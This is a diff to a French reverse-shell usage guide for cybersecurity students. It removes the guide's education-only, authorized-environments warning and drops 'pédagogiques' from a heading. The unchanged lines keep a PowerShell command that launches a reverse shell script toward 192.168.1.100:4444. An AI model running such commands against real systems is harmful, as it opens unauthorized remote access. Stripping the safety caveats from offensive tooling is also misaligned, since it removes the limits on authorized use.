@@ -1,9 +1,5 @@
 # Guide d'utilisation des Reverse Shells - Cybersécurité
 
-## AVERTISSEMENT IMPORTANT
-Ces scripts sont fournis à des fins **ÉDUCATIVES UNIQUEMENT** pour les étudiants en cybersécurité. 
-**UTILISEZ UNIQUEMENT dans des environnements de test autorisés et contrôlés.**
-
 ## Prérequis pour les tests
 1. **Environnement de laboratoire isolé** (machines virtuelles, réseau isolé)
 2. **Machine d'écoute** pour recevoir les connexions
@@ -41,7 +37,7 @@ Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
 .\reverse_shell_powershell.ps1 -TargetIP "192.168.1.100" -TargetPort 4444
 ```
 
-## Concepts pédagogiques couverts
+## Concepts couverts
 
 ### 1. **Redirection de flux**
 - Redirection des entrées/sorties standard
